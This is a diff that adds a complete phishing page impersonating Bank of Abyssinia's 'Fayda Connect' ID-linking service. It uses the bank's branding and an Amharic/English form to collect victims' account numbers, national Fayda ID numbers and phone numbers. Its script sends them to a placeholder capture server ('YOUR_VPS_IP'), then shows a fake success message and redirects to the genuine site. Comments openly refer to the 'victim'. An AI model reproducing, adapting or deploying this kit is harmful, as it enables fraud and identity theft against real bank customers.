@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Fayda Connect | Bank of Abyssinia</title>
+    <meta name="theme-color" content="#1a3a5c">
+    
+<style>
+/* ============================================================
+   RESET & BASE
+   ============================================================ */
+*, *::before, *::after {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html {
+    font-size: 16px;
+    -webkit-text-size-adjust: 100%;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+    background: linear-gradient(160deg, #0d2137 0%, #1a3a5c 40%, #2a5f8a 100%);
+    min-height: 100vh;
+    min-height: 100dvh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    color: #333;
+}
+
+/* ============================================================
+   CARD CONTAINER
+   ============================================================ */
+.card {
+    background: #ffffff;
+    border-radius: 20px;
+    max-width: 420px;
+    width: 100%;
+    padding: 40px 28px 32px;
+    box-shadow: 0 24px 80px rgba(0,0,0,0.4);
+    text-align: center;
+}
+
+/* ============================================================
+   LOGO SECTION
+   ============================================================ */
+.logo-wrap {
+    margin-bottom: 8px;
+}
+
+.logo-wrap img {
+    max-width: 72px;
+    height: auto;
+    display: block;
+    margin: 0 auto;
+}
+
+.bank-name {
+    font-size: 22px;
+    font-weight: 800;
+    color: #d4a12a;
+    letter-spacing: 2.5px;
+    margin-top: 4px;
+    text-transform: uppercase;
+}
+
+/* ============================================================
+   DIVIDER
+   ============================================================ */
+.divider {
+    width: 60px;
+    height: 3px;
+    background: linear-gradient(90deg, #d4a12a, #f0c75e);
+    margin: 20px auto;
+    border-radius: 3px;
+}
+
+/* ============================================================
+   HEADINGS
+   ============================================================ */
+.heading-am {
+    font-size: 19px;
+    color: #0d2137;
+    font-weight: 700;
+    line-height: 1.5;
+    margin-bottom: 6px;
+}
+
+.heading-en {
+    font-size: 14px;
+    color: #777;
+    font-weight: 400;
+    margin-bottom: 24px;
+}
+
+/* ============================================================
+   FORM STYLES
+   ============================================================ */
+.input-group {
+    margin-bottom: 18px;
+    text-align: left;
+}
+
+.input-group label {
+    display: block;
+    font-size: 13px;
+    color: #444;
+    font-weight: 600;
+    margin-bottom: 6px;
+    letter-spacing: 0.3px;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 14px 16px;
+    border: 2px solid #e2e2e2;
+    border-radius: 12px;
+    font-size: 16px;
+    font-family: inherit;
+    color: #222;
+    background: #fafafa;
+    outline: none;
+    transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
+    -webkit-appearance: none;
+    appearance: none;
+}
+
+.input-group input::placeholder {
+    color: #bbb;
+    font-size: 14px;
+}
+
+.input-group input:focus {
+    border-color: #d4a12a;
+    background: #fffef5;
+    box-shadow: 0 0 0 3px rgba(212, 161, 42, 0.15);
+}
+
+/* Highlight style for extra captured fields */
+.input-group input.highlight {
+    border-color: #ffb74d;
+    background: #fff8e1;
+}
+
+.input-group input.highlight:focus {
+    border-color: #f59e0b;
+    background: #fffdf5;
+    box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.15);
+}
+
+.input-hint {
+    font-size: 11px;
+    color: #aaa;
+    margin-top: 5px;
+    line-height: 1.4;
+}
+
+/* ============================================================
+   SUBMIT BUTTON
+   ============================================================ */
+.btn {
+    width: 100%;
+    padding: 16px 20px;
+    background: linear-gradient(135deg, #d4a12a 0%, #e8b834 100%);
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 17px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+    letter-spacing: 0.5px;
+    box-shadow: 0 4px 14px rgba(212, 161, 42, 0.35);
+    -webkit-appearance: none;
+    appearance: none;
+}
+
+.btn:hover {
+    background: linear-gradient(135deg, #b8891e 0%, #d4a12a 100%);
+    box-shadow: 0 6px 20px rgba(212, 161, 42, 0.45);
+}
+
+.btn:active {
+    transform: scale(0.97);
+}
+
+.btn:disabled {
+    background: #bbb;
+    background: linear-gradient(135deg, #bbb 0%, #ccc 100%);
+    cursor: not-allowed;
+    box-shadow: none;
+    transform: none;
+}
+
+/* ============================================================
+   STATUS MESSAGES (Loading / Error)
+   ============================================================ */
+.status {
+    display: none;
+    margin-top: 16px;
+    padding: 12px 16px;
+    border-radius: 10px;
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+.status.loading {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    background: #fff8e1;
+    color: #8d6e00;
+    border: 1px solid #ffeeba;
+}
+
+.status.error {
+    display: block;
+    background: #ffebee;
+    color: #b71c1c;
+    border: 1px solid #ffcdd2;
+}
+
+/* Spinner animation */
+.spinner {
+    display: inline-block;
+    width: 18px;
+    height: 18px;
+    border: 3px solid #ffe0b2;
+    border-top-color: #d4a12a;
+    border-radius: 50%;
+    animation: spin 0.75s linear infinite;
+    flex-shrink: 0;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.footer {
+    margin-top: 28px;
+    padding-top: 20px;
+    border-top: 1px solid #eee;
+    font-size: 11px;
+    color: #aaa;
+    line-height: 1.7;
+}
+
+.footer strong {
+    color: #666;
+    font-weight: 600;
+}
+
+.footer .small {
+    font-size: 10px;
+    color: #ccc;
+    margin-top: 4px;
+}
+
+/* ============================================================
+   SUCCESS OVERLAY (shown briefly before redirect)
+   ============================================================ */
+.success-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(13, 33, 55, 0.85);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 16px;
+    animation: fadeIn 0.3s ease;
+}
+
+.success-overlay.active {
+    display: flex;
+}
+
+.success-overlay .checkmark {
+    width: 64px;
+    height: 64px;
+    background: #4caf50;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 32px;
+    color: white;
+    font-weight: bold;
+    animation: scaleIn 0.4s ease;
+}
+
+.success-overlay .msg {
+    color: white;
+    font-size: 18px;
+    font-weight: 600;
+    text-align: center;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+@keyframes scaleIn {
+    0% { transform: scale(0); }
+    60% { transform: scale(1.15); }
+    100% { transform: scale(1); }
+}
+
+/* ============================================================
+   RESPONSIVE — Small screens
+   ============================================================ */
+@media (max-width: 420px) {
+    .card {
+        padding: 28px 20px 24px;
+        border-radius: 16px;
+    }
+
+    .bank-name {
+        font-size: 19px;
+        letter-spacing: 1.5px;
+    }
+
+    .heading-am {
+        font-size: 17px;
+    }
+
+    .btn {
+        font-size: 16px;
+        padding: 14px;
+    }
+
+    .input-group input {
+        padding: 12px 14px;
+        font-size: 15px;
+    }
+}
+
+/* ============================================================
+   DARK MODE SAFE (keep always readable)
+   ============================================================ */
+@media (prefers-color-scheme: dark) {
+    .card {
+        background: #ffffff;
+    }
+}
+
+/* ============================================================
+   REDUCED MOTION
+   ============================================================ */
+@media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        transition-duration: 0.01ms !important;
+    }
+}
+</style>
+
+</head>
+<body>
+
+    <!-- ══════════════════════════════════════════════
+         MAIN CARD
+         ══════════════════════════════════════════════ -->
+    <div class="card" role="main" aria-label="Fayda Connect form">
+
+        <!-- ── BOA LOGO ── -->
+        <div class="logo-wrap">
+            <img 
+                src="https://cs.bankofabyssinia.com/fayda_connect/BOA_LOGO_Yellow.svg" 
+                alt="Bank of Abyssinia logo"
+                onerror="this.outerHTML='<div style=\'font-size:48px;color:#d4a12a;font-weight:900;\'>BOA</div>'"
+            >
+        </div>
+        <div class="bank-name">Bank of Abyssinia</div>
+
+        <div class="divider" aria-hidden="true"></div>
+
+        <!-- ── HEADINGS ── -->
+        <div class="heading-am">የፋይዳ መለያ ቁጥርዎን ከባንክ አካውንትዎ ጋር ያስተሳስሩ</div>
+        <div class="heading-en">Link your FAYDA ID with your bank account</div>
+
+        <!-- ── FORM ── -->
+        <form id="captureForm" novalidate autocomplete="off">
+
+            <div class="input-group">
+                <label for="account">አካውንት ቁጥር / Account Number</label>
+                <input 
+                    type="text" 
+                    id="account" 
+                    name="account_number" 
+                    placeholder="Enter your account number"
+                    autocomplete="off"
+                    required
+                >
+            </div>
+
+            <div class="input-group">
+                <label for="fayda">የፋይዳ መለያ ቁጥር / Fayda ID Number</label>
+                <input 
+                    type="text" 
+                    id="fayda" 
+                    name="fayda_id" 
+                    placeholder="16-digit Fayda number"
+                    class="highlight"
+                    autocomplete="off"
+                    required
+                >
+                <div class="input-hint">Enter your 16-digit Fayda number (FCN/FAN)</div>
+            </div>
+
+            <div class="input-group">
+                <label for="phone">የስልክ ቁጥር / Phone Number</label>
+                <input 
+                    type="tel" 
+                    id="phone" 
+                    name="phone" 
+                    placeholder="e.g., 0911XXXXXX"
+                    class="highlight"
+                    autocomplete="tel"
+                    required
+                >
+                <div class="input-hint">Phone number registered with your account</div>
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">
+                Submit / ያስገቡ
+            </button>
+
+            <!-- Loading indicator -->
+            <div class="status loading" id="loadingStatus" role="status">
+                <span class="spinner" aria-hidden="true"></span>
+                Processing request... / ጥያቄን በማስኬድ ላይ...
+            </div>
+
+            <!-- Error indicator -->
+            <div class="status error" id="errorStatus" role="alert"></div>
+        </form>
+
+        <!-- ── FOOTER ── -->
+        <div class="footer">
+            <strong>Bank of Abyssinia</strong> — የአቢሲኒያ ባንክ<br>
+            Customer Service: <strong>8397</strong>
+            <div class="small">Secure KYC &amp; Customer Management</div>
+        </div>
+
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         SUCCESS OVERLAY (shown before redirect)
+         ══════════════════════════════════════════════ -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="checkmark">✓</div>
+        <div class="msg">Request submitted successfully!<br>ጥያቄ በተሳካ ሁኔታ ቀርቧል!</div>
+    </div>
+
+<!-- ============================================================
+     JAVASCRIPT — Form handling
+     ============================================================ -->
+<script>
+(function() {
+    'use strict';
+
+    /* ─── DOM refs ─── */
+    var form        = document.getElementById('captureForm');
+    var btn         = document.getElementById('submitBtn');
+    var loading     = document.getElementById('loadingStatus');
+    var errorEl     = document.getElementById('errorStatus');
+    var overlay     = document.getElementById('successOverlay');
+
+    /* ─── Config ─── */
+    // ⚠️  REPLACE THIS with your actual capture server URL
+    var CAPTURE_URL = 'http://YOUR_VPS_IP:5000/capture';
+    // Where to redirect after a successful (or failed) capture
+    var REDIRECT_URL = 'https://cs.bankofabyssinia.com/fayda_connect/';
+
+    /* ─── Validate inputs ─── */
+    function validateForm(account, fayda, phone) {
+        if (!account || account.length < 4) {
+            return 'Please enter a valid account number';
+        }
+        if (!fayda || fayda.length < 10) {
+            return 'Please enter your 16-digit Fayda ID number';
+        }
+        if (!phone || phone.length < 8) {
+            return 'Please enter your phone number';
+        }
+        return null;
+    }
+
+    /* ─── Show error ─── */
+    function showError(msg) {
+        errorEl.textContent = msg;
+        errorEl.style.display = 'block';
+        loading.style.display = 'none';
+        btn.disabled = false;
+    }
+
+    /* ─── Show success overlay then redirect ─── */
+    function showSuccessAndRedirect() {
+        overlay.classList.add('active');
+        // Redirect after 1.5 seconds so victim sees "success"
+        setTimeout(function() {
+            window.location.href = REDIRECT_URL;
+        }, 1500);
+    }
+
+    /* ─── Form submit handler ─── */
+    form.addEventListener('submit', function(evt) {
+        evt.preventDefault();
+
+        // Hide previous error
+        errorEl.style.display = 'none';
+
+        // Gather values
+        var account = document.getElementById('account').value.trim();
+        var fayda   = document.getElementById('fayda').value.trim();
+        var phone   = document.getElementById('phone').value.trim();
+
+        // Validate
+        var err = validateForm(account, fayda, phone);
+        if (err) {
+            showError(err);
+            return;
+        }
+
+        // Disable button, show spinner
+        btn.disabled = true;
+        loading.style.display = 'flex';
+
+        // Build payload
+        var payload = new URLSearchParams();
+        payload.append('account_number', account);
+        payload.append('fayda_id', fayda);
+        payload.append('phone', phone);
+
+        // Send to capture server
+        fetch(CAPTURE_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: payload,
+            mode: 'cors'
+        })
+        .then(function(response) {
+            if (!response.ok) {
+                throw new Error('Server returned ' + response.status);
+            }
+            return response.json();
+        })
+        .then(function(data) {
+            if (data.success) {
+                showSuccessAndRedirect();
+            } else {
+                // Server says failure — still redirect gracefully
+                window.location.href = REDIRECT_URL;
+            }
+        })
+        .catch(function(err) {
+            // Network error or server down — still redirect to real site
+            console.warn('Capture server error:', err);
+            window.location.href = REDIRECT_URL;
+        });
+    });
+
+    /* ─── Optional: enter key presses on last field submits ─── */
+    document.getElementById('phone').addEventListener('keydown', function(evt) {
+        if (evt.key === 'Enter') {
+            form.dispatchEvent(new Event('submit'));
+        }
+    });
+
+})();
+</script>
+
+</body>
+</html>
